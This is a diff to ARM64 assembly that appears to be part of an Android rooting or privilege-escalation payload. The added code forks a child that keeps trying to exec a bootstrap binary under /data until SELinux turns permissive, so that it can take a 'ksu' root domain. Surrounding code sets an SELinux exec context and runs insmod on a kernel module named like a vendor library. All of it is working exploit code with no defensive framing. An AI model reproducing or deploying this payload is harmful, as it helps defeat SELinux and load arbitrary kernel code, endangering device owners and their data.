@@ -20,6 +20,8 @@ attr_exec:
     .asciz "/proc/self/attr/exec"
 exe_path:
     .asciz "/vendor/bin/insmod"
+bootstrap_path:
+    .asciz "/data/user_de/0/df.root/bootstrap"
 ko_target:
     .ascii "/vendor/lib64/libbinderdebug.so\0"
     .skip 32, 0                             /* pad to 64 bytes — longest candidate path */
@@ -89,6 +91,44 @@ libcxx_start:
     // ── worker child ──────────────────────────────────────────────────────
     sub     sp, sp, 32
 
+    // Child B stays in init context and execs bootstrap, so bootstrap can take
+    // the ksu domain for the soft reboot. The retry loop covers the wait for permissive.
+    mov     x0, #SIGCHLD
+    mov     x1, xzr
+    mov     x2, xzr
+    mov     x3, xzr
+    mov     x4, xzr
+    mov     x8, #SYS_clone
+    svc     0
+    cbnz    w0, do_insmod       // child A: fork the insmod grandchild
+
+    mov     x19, #0             // attempt counter
+retry_bootstrap:
+    adr     x1, bootstrap_path
+    str     x1, [sp]
+    str     xzr, [sp, 8]
+    adr     x0, bootstrap_path
+    mov     x1, sp
+    mov     x2, xzr
+    mov     x8, #SYS_execve
+    svc     0
+
+    add     x19, x19, #1
+    cmp     x19, #400
+    b.ge    myexit
+
+    // nanosleep({0, 50ms}) at sp+16, then retry
+    str     xzr, [sp, 16]
+    movz    x2, #0xF080
+    movk    x2, #0x02FA, lsl #16
+    str     x2, [sp, 24]
+    add     x0, sp, #16
+    mov     x1, xzr
+    mov     x8, #SYS_nanosleep
+    svc     0
+    b       retry_bootstrap
+
+do_insmod:
     // Fork grandchild: set SELinux exec context → execve insmod
     mov     x0, #SIGCHLD
     mov     x1, xzr
